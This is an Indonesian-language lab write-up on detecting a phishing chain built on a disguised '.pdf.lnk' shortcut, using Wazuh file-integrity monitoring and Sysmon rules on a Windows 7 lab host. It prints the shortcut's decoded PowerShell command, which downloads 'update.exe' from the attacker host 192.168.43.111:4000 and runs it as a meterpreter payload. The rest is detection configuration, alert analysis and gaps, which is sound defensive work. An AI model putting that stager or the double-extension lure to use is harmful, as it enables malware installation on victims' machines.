# Phishing via Malicious LNK (T1566.001 + T1204.002) — Win7 Victim

## Tujuan

Simulasi **initial access via phishing** ke Win7 victim (`10.10.20.10`, LAN2): user `lab\p.analyst` nerima file **shortcut (.lnk) berbahaya** yang nyamar jadi PDF ([T1566.001](https://attack.mitre.org/techniques/T1566/001/) — Spearphishing Attachment), lalu dia sendiri yang buka file itu dan ngetrigger eksekusi payload ([T1204.002](https://attack.mitre.org/techniques/T1204/002/) — User Execution: Malicious File). Fokusnya: sinyal apa yang bisa ditangkap **FIM (syscheck)** dan **Sysmon** di endpoint sepanjang rantai phishing ini, dari file mendarat sampai payload konek balik ke attacker.

Ini **bukan** simulasi phishing (gak ada email server / gophish). Yang diperagakan adalah **artefak dan rantai eksekusinya**: file `.lnk` yang keliatan kayak dokumen tapi nyimpen command tersembunyi di field `Arguments`. Di lab ini isinya:

```powershell
-NoProfile -WindowStyle Hidden -EncodedCommand <base64>
# decoded:
$p=$env:TEMP+"\update.exe"; (New-Object Net.WebClient).DownloadFile('http://192.168.43.111:4000/update.exe',$p); Start-Process $p
```

Begitu LNK dibuka, dia nge-spawn `powershell.exe` tersembunyi → download `update.exe` (payload `windows/meterpreter/reverse_tcp` bikinan msfvenom) dari web server Kali → jalanin langsung → Kali dapet meterpreter session. Dalam rangkaian lab Win7, ini **jalur masuk (initial access)** — foothold pertama sebelum lanjut ke [persistence](<../../Persistence/Scheduled Task (T1053.005)/README.md>), [discovery](<../../Discovery/System and Account Discovery (T1082 + T1087)/README.md>), dan [execution](<../../Execution/Command and Scripting Interpreter (T1059.001 - PowerShell)/README.md>).

Lab ini **gak bikin custom rule baru**. Justru itu poinnya: rule Sysmon yang udah ada dari lab [T1059.001](<../../Execution/Command and Scripting Interpreter (T1059.001 - PowerShell)/README.md>) (`100601`, `100602`) **udah nangkep** stage eksekusi + C2 dari rantai phishing ini. Yang ditambah cuma **layer FIM baru** di dua folder (`Downloads` + `Temp`) buat nangkep sisi **artefak file**: LNK yang mendarat dan payload yang di-drop. Hasilnya satu insiden yang kelihatan dari dua sudut sekaligus — file dan proses.

Sesuai filosofi lab: **deteksi dulu, bukan eksploitasi.**

---

## Prerequisites

- **Sysmon terpasang & jalan di Win7** — lihat [`win7-sysmon.md`](../../../../../Infrastructure/win7-sysmon.md). Deteksi eksekusi + C2 bersandar ke **Event 1 (ProcessCreate)** dan **Event 3 (NetworkConnect)**.
- **Wazuh Agent di Win7 Active** — lihat [`win7-wazuh-agent.md`](../../../../../Infrastructure/win7-wazuh-agent.md).
- **Rule Sysmon dari lab T1059.001 aktif** — `100601` (encoded PowerShell) dan `100602` (network connect korelasi) di [`Detection-Engineer/wazuh/rule/sysmon_rules.xml`](../../../../../Detection-Engineer/wazuh/rule/sysmon_rules.xml). Lab ini mereuse keduanya, gak bikin yang baru.
- **FIM scope baru di Win7** — dua stanza syscheck (Downloads + Temp), setup lengkap di [`win7-fim-setup.md`](../../../../../Infrastructure/win7-fim-setup.md), ringkasnya di [Step 2](#2-siapkan-scope-fim-downloads--temp).
- **Payload `update.exe` + C2 handler di Kali** — payload `windows/meterpreter/reverse_tcp` udah dibikin msfvenom, di-serve lewat HTTP di `192.168.43.111:4000`, dan `msfconsole` udah pasang handler-nya.
- **Akun domain biasa** — lab ini pakai `lab\p.analyst` (SID `...-1104`), **bukan** Administrator. Sesuai skenario phishing: korban itu user biasa, bukan admin.
- **Snapshot VM Win7** sebelum mulai, biar gampang balik ke state bersih.

---

## Step-by-Step

### 1. Siapkan payload & C2 di Kali

Attacker (Kali, `192.168.43.111`, di luar firewall) nyiapin tiga hal:

- **`update.exe`** — payload `windows/meterpreter/reverse_tcp` dari msfvenom, format PE executable.
- **Web server HTTP di port `4000`** — nge-serve `update.exe` biar bisa di-download korban lewat `http://192.168.43.111:4000/update.exe`.
- **Handler di `msfconsole`** — `exploit/multi/handler` dengan payload yang sama, nunggu koneksi balik dari korban.

![Setup payload dan handler di Kali](<./assets/kali linux.png>)

Fokus lab ini deteksi, jadi detail weaponisasi sengaja gak diurai panjang — payload udah jadi, tinggal dipakai sebagai bahan yang mesti kelihatan di SIEM.

### 2. Siapkan scope FIM (Downloads + Temp)

Dua folder ini yang paling relevan buat rantai phishing: **Downloads** tempat file mendarat, **Temp** tempat payload di-drop dan dieksekusi. Dua-duanya juga ramai dipakai system dan user, jadi scope-nya dipersempit ke **ekstensi executable** aja dan sebagian noise di-ignore.

**Downloads — semua user:**

```xml
<directories check_all="yes" realtime="yes" whodata="yes">C:\Users\*\Downloads</directories>
<ignore type="sregex">\.crdownload$|\.part$|\.tmp$|\.download$</ignore>
<restrict type="sregex">\.exe$|\.bat$|\.cmd$|\.ps1$|\.vbs$|\.msi$|\.scr$|\.dll$|\.lnk$</restrict>
```

**Temp — system + per-user:**

```xml
<directories check_all="yes" realtime="yes" whodata="yes">C:\Windows\Temp</directories>
<directories check_all="yes" realtime="yes" whodata="yes">C:\Users\*\AppData\Local\Temp</directories>
<restrict type="sregex">\.exe$|\.bat$|\.cmd$|\.ps1$|\.vbs$|\.js$|\.wsf$|\.msi$|\.scr$|\.dll$|\.com$|\.hta$|\.cpl$</restrict>
<ignore type="sregex">\.log$|\.tmp$|\.etl$|\.cab$</ignore>
```

| Opsi | Fungsi |
|------|--------|
| `realtime="yes"` | Event langsung pas file berubah, gak nunggu scan periodik |
| `whodata="yes"` | Nempelin **proses & user** yang bikin perubahan (lewat Windows audit). Ini yang bikin FIM bisa jawab "siapa yang naruh file ini" |
| `restrict` | Cuma ekstensi executable/script yang dihitung — di Downloads fokus ke `.lnk`, di Temp ke stager exe |
| `ignore` | Buang noise turunan browser (`.crdownload`, `.part`) dan system (`.log`, `.etl`, `.cab`) |

`C:\Users\*\Downloads` dan `C:\Users\*\AppData\Local\Temp` pakai wildcard biar nutup semua profil user, bukan cuma `p.analyst`.

### 3. Simulasi delivery — LNK mendarat di Downloads

Delivery-nya diperagakan dengan naruh file `.lnk` ke folder Downloads `p.analyst` (menggantikan langkah "korban nge-download attachment dari email"). File-nya dinamain **`invoice_september.pdf.lnk`** — **double extension**, biar di Explorer keliatan `invoice_september.pdf` sementara ekstensi asli `.lnk` ketutup.

![Simulasi LNK mendarat dari spearphishing](<./assets/simulasi lnk download from spearphishing.png>)

![File LNK di folder Downloads](<./assets/lnk file download.png>)

### 4. Korban buka LNK

`p.analyst` klik file yang dia kira PDF. Explorer nge-eksekusi target LNK (powershell tersembunyi), dan rantai di [Tujuan](#tujuan) jalan sampai meterpreter session kebuka di Kali.

![Meterpreter session di Kali](<./assets/meterpreter.png>)

![Reverse shell aktif](<./assets/rev_shell.png>)

---

## Verifikasi

Empat alert fire di Wazuh dari satu rantai ini, dari dua decoder yang beda (`syscheck` dan `windows_eventchannel`). Semua waktu di bawah **UTC** (dari field `utcTime`/`timestamp` log; Dell jalan di UTC, +7 buat WIB).

| # | Waktu (UTC) | Rule | Level | Sumber | Apa |
|---|-------------|------|-------|--------|-----|
| 1 | 07:45:52 | `554` | 5 | FIM (syscheck) | `invoice_september.pdf.lnk` **added** di Downloads |
| 2 | 07:49:41 | `100601` | 12 | Sysmon Event 1 | `explorer.exe` → `powershell.exe -EncodedCommand` |
| 3 | 07:49:56 | `550` | 7 | FIM (syscheck) | `update.exe` **modified** di Temp |
| 4 | 07:49:56 | `100602` | 14 | Sysmon Event 3 | `powershell.exe` → `192.168.43.111:4000` |

![Rule 100601, 550, 100602 di Dashboard](<./assets/rule 100601,550,100602.png>)

Yang menarik: dua alert FIM (`554`, `550`) itu **rule bawaan Wazuh**, bukan custom. Yang bikin dia fire adalah **scope syscheck baru** dari Step 2 — tanpa itu, dua folder ini gak dipantau dan artefak file-nya lewat tanpa jejak.

### A. FIM nangkep artefak phishing — rule 554

Begitu LNK mendarat di Downloads, syscheck bikin alert `554` ("File added to the system", level 5):

```
File 'c:\users\p.analyst\downloads\invoice_september.pdf.lnk' added
Mode: whodata
```

| Field | Nilai |
|-------|-------|
| `path` | `c:\users\p.analyst\downloads\invoice_september.pdf.lnk` |
| `sha256_after` | `87719fdbf9e99c866cf6887ecd7096166e7887d44b047433623693e7102dea7f` |
| `size_after` | `2776` |
| `uname_after` | `p.analyst` |
| `audit.process.name` | `...\WindowsPowerShell\v1.0\powershell.exe` (pid `3488`) |
| `mode` | `whodata` |

Dua hal yang bikin alert ini berguna:

- **Whodata attribution.** Karena `whodata="yes"`, alert bawa `audit.process` — proses yang naruh file ini `powershell.exe` (pid `3488`, ini proses "delivery"). Jadi FIM gak cuma bilang "ada file baru", tapi "file baru ini ditaruh oleh proses X, user Y". Field permission (`win_perm_after`) juga ikut kebawa: owner `p.analyst`, plus `SYSTEM` dan `Administrators`.
- **`.lnk` lolos restrict, `.pdf` palsunya gak nipu FIM.** Nama file `invoice_september.pdf.lnk` nipu mata di Explorer, tapi `restrict` FIM mancing dari **ekstensi asli** (`.lnk$`), jadi file-nya tetap masuk radar.

![Permission & metadata file LNK](<./assets/persmission.png>)

**Catatan level.** `554` cuma level 5 — di bawah threshold Integrator (`≥7`), jadi gak ikut ke n8n/Jira/Discord. Buat file `.lnk` di Downloads yang namanya double-extension, level segini sebenernya **ketinggian rendahnya**. Kandidat custom rule (naikin `554` khusus `.lnk` di Downloads jadi level lebih tinggi) dicatat di [Batasan](#e-batasan--yang-gak-ketangkep).

### B. Sysmon nangkep eksekusi — rule 100601

LNK dibuka → Explorer nge-spawn PowerShell tersembunyi. Sysmon Event 1 kena rule `100601` (level 12) dari lab T1059.001:

| Field | Nilai |
|-------|-------|
| `parentImage` | `C:\Windows\explorer.exe` (pid `2560`) |
| `image` | `...\WindowsPowerShell\v1.0\powershell.exe` (pid `3884`) |
| `commandLine` | `powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand JAB...` |
| `user` | `LAB\p.analyst` |
| `currentDirectory` | `C:\Users\p.analyst\Downloads\` |

![Alert 100601 encoded PowerShell](<./assets/rule 100601.png>)

**Yang bikin konteks ini beda dari lab T1059.001.** Rule `100601` nyocokin flag `-EncodedCommand` + `-NoProfile`, dan itu match sama persis kayak pas lab T1059 (di sana PowerShell diketik manual). Bedanya ada di **`parentImage`**: di sini `explorer.exe`, dan `currentDirectory` `...\Downloads\`. Itu tanda tangan **"user klik file"**, bukan "admin ngetik di cmd". Kombinasi `explorer.exe` → `powershell -enc` yang jalan dari folder Downloads itu jauh lebih kuat sebagai sinyal phishing daripada string encoded-nya sendiri. `100601` belum manfaatin `parentImage` ini — dicatat sebagai kandidat penguat di [Batasan](#e-batasan--yang-gak-ketangkep).

### C. FIM nangkep payload yang di-drop — rule 550 (bukan 554)

PowerShell nulis `update.exe` ke `%TEMP%`. Yang fire di sini `550` ("Integrity checksum changed", level 7) — **modified**, bukan added:

```
File 'c:\users\p.analyst\appdata\local\temp\update.exe' modified
Mode: whodata
Changed attributes: mtime
Old modification time was: '1790589878', now it is '1790754596'
```

| Field | Nilai |
|-------|-------|
| `path` | `c:\users\p.analyst\appdata\local\temp\update.exe` |
| `event` | `modified` |
| `mtime_before` | `2026-09-28T10:04:38` |
| `mtime_after` | `2026-09-30T07:49:56` |
| `sha256_after` | `3ba26e6f5f97de8c97b42670edffc6f07e5f249719e366c90f109236f69746be` |
| `audit.process.name` | `powershell.exe` (pid `3884`) |

**Kenapa `modified`, bukan `added`.** `mtime_before`-nya `2026-09-28` — artinya `update.exe` **udah ada** di Temp dari run lab sebelumnya (28 Sep). Waktu `DownloadFile` nulis file baru dengan nama sama, syscheck lihatnya checksum berubah → `550` (modified), bukan `554` (added). **Di environment bersih, download pertama bakal muncul sebagai `554` (added).** Ini artefak dari lab yang gak di-reset ke snapshot bersih, dicatat apa adanya.

![Alert 550 update.exe modified](<./assets/rule 550.png>)

Yang penting tetap kejaga: **whodata nyambungin file ke proses yang bener** — pid `3884`, yaitu proses PowerShell yang sama dari `100601` (section B). Jadi FIM dan Sysmon nunjuk ke proses tunggal yang sama; file event dan process event bisa dikorelasi lewat pid.

> **Mitre mapping bawaan `550` meleset dari konteks kita.** Rule `550` bawaan Wazuh nge-tag `T1565.001 – Stored Data Manipulation (Impact)`. Di rantai phishing ini konteks aslinya **T1105 (Ingress Tool Transfer)** — payload di-download masuk. Mapping bawaan gak diubah (itu rule global, dipakai semua agent); konteksnya cukup dicatat di sini.

### D. Sysmon nangkep C2 download — rule 100602

Bareng waktu file ditulis, PowerShell konek keluar ke Kali. Sysmon Event 3 kena `100602` (level 14):

| Field | Nilai |
|-------|-------|
| `image` | `powershell.exe` (pid `3884`) |
| `sourceIp` | `10.10.20.10:49193` |
| `destinationIp` | `192.168.43.111:4000` |
| `protocol` | `tcp` |

![Alert 100602 network connect ke Kali](<./assets/rule 100602.png>)

`100602` itu rule korelasi dari lab T1059.001: dia naikin severity Event 3 kalau proses-nya sama dengan yang barusan kena `100601` (encoded PowerShell). Di sini match — `processGuid` Event 3 (`{AF48A474-BF15-...}`) identik dengan yang di `100601`. Jadi koneksi ke `192.168.43.111:4000` ke-flag sebagai **egress dari PowerShell encoded yang tadi**, bukan koneksi random.

Perlu dicatat: `:4000` ini **koneksi download** (HTTP GET `update.exe` dari web server Kali), bukan sesi meterpreter-nya. Sesi meterpreter (reverse_tcp dari `update.exe` ke LPORT handler) proses-nya beda (`update.exe`, bukan `powershell.exe`) dan **gak ada di antara empat alert ini** — lihat [Batasan](#e-batasan--yang-gak-ketangkep).

### E. Batasan — yang gak ketangkep

- **Eksekusi dropper (`update.exe`) gak jadi alert.** `Start-Process $p` mestinya bikin Sysmon Event 1 baru (`powershell.exe` → `update.exe`), tapi gak ada rule yang naikin event itu jadi alert — sama kayak temuan lab lain, Event 1 bawaan (`61603`) level 0. Buktinya eksekusi jalan ada di sisi Kali (`meterpreter.png`), bukan di Wazuh.
- **Callback meterpreter gak kelihatan di empat alert ini.** Reverse_tcp dari `update.exe` ke handler Kali proses-nya `update.exe`, bukan `powershell.exe`, jadi gak nyambung ke korelasi `100602` (yang nyari proses eks-`100601`). Apakah dia bikin Event 3 sendiri yang cuma mampir di archives — **belum dicek**. Ini gap deteksi C2 tahap dua.
- **`554` buat `.lnk` cuma level 5.** File `.lnk` double-extension di Downloads itu sinyal phishing yang kuat, tapi level 5 gak lolos threshold notifikasi. **Kandidat custom rule:** anak dari `554` yang match `\.lnk$` di path Downloads (atau nama double-extension `\.(pdf|docx?|xlsx?)\.lnk$`) dinaikin ke level ≥7. Belum dibikin — sesuai konvensi, gap didokumentasikan dulu sebelum bikin rule.
- **`100601` cuma nangkep PowerShell yang encoded.** Kalau LNK versi lain nge-spawn PowerShell tanpa `-EncodedCommand`/`-NoProfile` (misal langsung `-Command IEX ...`), `100601` gak match. Pembeda "user klik file" (`parentImage` = `explorer.exe`) juga belum dipakai `100601`. Dua-duanya ditutup rule general `100610` — lihat [section F](#f-rule-tambahan-setelah-run--100610-general-fallback).
- **Payload pre-existing bikin `554` → `550`.** Karena Temp gak di-reset, download muncul sebagai `modified`, bukan `added`. Buat run yang bener-bener bersih, snapshot Win7 harus dibalikin dulu.
- **Double-extension itu sendiri belum dideteksi.** Yang nangkep `.lnk` sekarang murni dari `restrict` FIM di folder. Pola nama `*.pdf.lnk` (dokumen palsu) belum jadi sinyal khusus di rule mana pun.

---

## F. Rule tambahan setelah run — 100610 (general fallback)

Section E nyebut dua celah di `100601`: dia cuma match PowerShell yang **encoded**, dan belum manfaatin **`parentImage`**. Rule `100610` ditambah buat nutup dua-duanya dari sisi general — apapun command line-nya, kalau `powershell.exe` di-spawn **langsung sama `explorer.exe`**, itu pola "user klik sesuatu yang jalanin PowerShell", dan itu jarang wajar di endpoint biasa.

```xml
<rule id="100610" level="10">
    <if_sid>61603</if_sid>
    <field name="win.system.eventID" type="pcre2">^1$</field>
    <field name="win.eventdata.image" type="pcre2">(?i)\\powershell\.exe$</field>
    <field name="win.eventdata.parentImage" type="pcre2">(?i)\\explorer\.exe$</field>
    <description>Sysmon: PowerShell spawned directly by explorer.exe (possible user-initiated malicious file execution)</description>
    <mitre>
        <id>T1204.002</id>
        <id>T1059.001</id>
    </mitre>
    <group>execution,user_execution,</group>
</rule>
```

| Field | Fungsi |
|-------|--------|
| `eventID` `^1$` | Process Create |
| `image` `\\powershell\.exe$` | Yang di-spawn PowerShell |
| `parentImage` `\\explorer\.exe$` | Induknya Explorer — tanda tangan "diklik user", bukan diketik di cmd atau dipanggil script/service |
| `mitre` T1204.002 + T1059.001 | User Execution (klik file) → PowerShell |
| `level` 10 | Di bawah `100601` (12). Ini jaring pengaman general, bukan sinyal sekuat command encoded |

**Kenapa rule terpisah, bukan anak `100601`.** Tujuannya justru nangkep kasus yang `100601` **lewatin**. Kalau dibikin anak `100601`, dia cuma jalan saat `100601` udah match — padahal yang mau dijaring adalah PowerShell-dari-Explorer yang command-nya *gak* encoded. Jadi `100610` berdiri sendiri, if_sid ke `61603` langsung.

**⚠️ Interaksi dengan `100601` — BELUM tervalidasi live.** Rule ini ditambah **setelah** run 30 Sep, jadi **gak ada di antara 4 alert di atas**. Di event LNK kemarin, `parentImage` = `explorer.exe` dan `image` = `powershell.exe`, jadi event itu **match `100601` DAN `100610` sekaligus**. Wazuh bikin satu alert per event, jadi cuma satu yang keluar. Perkiraan (aturan sibling: rule yang match duluan di urutan file yang menang, dan `100601` ada sebelum `100610`): event encoded tetap jadi **`100601`** (level 12), `100610` cuma keluar buat kasus non-encoded. **Tapi ini belum dibuktikan** — perlu run terpisah:

1. **Non-encoded** — PowerShell dari Explorer tanpa `-enc`/`-nop` (mis. `.lnk` isi `powershell -Command "..."`). Ekspektasi: `100610` fire, `100601` nggak.
2. **Encoded (ulang skenario)** — pastiin event yang sama tetap keluar sebagai `100601`, bukan ke-override `100610`.

**Batasan.** `explorer.exe` → `powershell.exe` **juga muncul di pemakaian sah**: user buka PowerShell dari Start menu / double-click `.ps1` / admin jalanin script manual. Di lab ini aman (cuma `p.analyst`, aktivitas terkontrol), tapi di produksi `100610` bakal berisik dan perlu discope — digabung sama commandLine mencurigakan, `-WindowStyle Hidden`, atau di-whitelist per baseline host. Sebagai fallback lab yang sengaja lebar, level 10 diterima apa adanya.

> **Catatan ID:** `100610` sebelumnya sempat dipakai tier "recon pelan" di lab [Discovery](<../../Discovery/System and Account Discovery (T1082 + T1087)/README.md>) lalu **dihapus**. Sekarang ID-nya dipakai ulang buat rule ini. Pastiin definisi lama udah bersih di Manager Dell biar gak ada sisa.

---

## Kesimpulan

Rantai phishing LNK ini kelihatan **utuh di Wazuh dari file mendarat sampai payload konek balik**, lewat empat alert dari dua decoder: FIM nangkep `.lnk` mendarat di Downloads (`554`) dan `update.exe` di-drop di Temp (`550`), Sysmon nangkep PowerShell encoded yang di-spawn LNK (`100601`) dan koneksi download ke Kali (`100602`). Yang bikin ini satu cerita, bukan empat kejadian lepas, adalah **whodata** dan **processGuid**: file event `550` dan process event `100601`/`100602` sama-sama nunjuk ke pid `3884`.

Pelajaran utamanya: buat teknik ini **gak perlu custom rule baru**. Rule Sysmon dari lab T1059.001 udah nutup stage eksekusi dan C2 apa adanya — phishing LNK cuma cara lain nyampein PowerShell encoded yang sama. Yang beneran nambah nilai di sini adalah **layer FIM di folder yang tepat**: `Downloads` (tempat file mendarat) dan `Temp` (tempat payload distaging), dipersempit ke ekstensi executable biar gak berisik. Tanpa scope itu, sisi artefak file dari serangan ini gak keliatan sama sekali.

Tiga hal yang jujur dicatat sebagai batas: (1) eksekusi `update.exe` dan sesi meterpreter-nya **gak jadi alert** — buktinya cuma di sisi Kali, jadi visibilitas C2 tahap dua masih gap; (2) `554` buat `.lnk` masih level 5, di bawah ambang notifikasi, padahal double-extension di Downloads layak diangkat; (3) `parentImage` `explorer.exe` — pembeda "user klik file" yang paling kuat — belum dipakai `100601`. Poin ketiga langsung ditindaklanjuti dengan rule general `100610` ([section F](#f-rule-tambahan-setelah-run--100610-general-fallback)) yang nangkep `explorer.exe` → `powershell.exe` apapun command-nya, sebagai jaring pengaman saat `100601` lewatin PowerShell non-encoded — tapi rule itu ditambah setelah run, jadi behavior-nya (termasuk siapa yang menang saat overlap sama `100601`) masih nunggu validasi run berikutnya.
